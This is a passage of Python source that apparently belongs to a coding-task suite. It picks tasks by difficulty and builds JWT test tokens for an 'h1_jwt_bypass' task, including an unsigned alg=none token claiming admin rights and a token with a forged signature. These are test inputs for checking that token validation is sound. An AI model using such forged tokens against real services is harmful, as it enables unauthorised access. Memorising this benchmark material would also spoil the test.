            raise ValueError(f"Unknown difficulty: {difficulty}. Choose from: easy, medium, hard")
        return rng.choice(TASKS_BY_DIFFICULTY[difficulty])

    return rng.choice(ALL_TASKS)


def _generate_jwt(payload: dict, secret: str, alg: str = "HS256") -> str:
    """Helper to generate JWT tokens for testing h1_jwt_bypass task."""
    import base64
    import hashlib
    import hmac
    import json

    header = {"alg": alg, "typ": "JWT"}

    def b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    h = b64url(json.dumps(header).encode())
    p = b64url(json.dumps(payload).encode())

    if alg == "none":
        return f"{h}.{p}."

    msg = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url(sig)}"


def resolve_jwt_test_cases():
    """Resolve the JWT placeholder tokens in h1_jwt_bypass test cases."""
    task = TASK_BY_ID.get("h1_jwt_bypass")
    if not task:
        return

    valid1 = _generate_jwt({"sub": "user123", "role": "user"}, "mysecret")
    valid2 = _generate_jwt({"sub": "admin", "role": "admin"}, "serversecret")
    alg_none = _generate_jwt({"sub": "user123", "role": "admin"}, "mysecret", alg="none")
    # Tampered: valid header+payload but wrong signature
    tampered = _generate_jwt({"sub": "admin", "role": "admin"}, "wrongsecret")

    for tc in task.test_cases:
        if tc.input_args and isinstance(tc.input_args[0], str):
            args_list = list(tc.input_args)
            if args_list[0] == "__VALID_JWT__":
                args_list[0] = valid1
            elif args_list[0] == "__VALID_JWT_2__":
                args_list[0] = valid2
            elif args_list[0] == "__ALG_NONE_JWT__":
                args_list[0] = alg_none
            elif args_list[0] == "__TAMPERED_JWT__":
                args_list[0] = tampered
            tc.input_args = tuple(args_list)


# Resolve JWT placeholders at import time
resolve_jwt_test_cases()
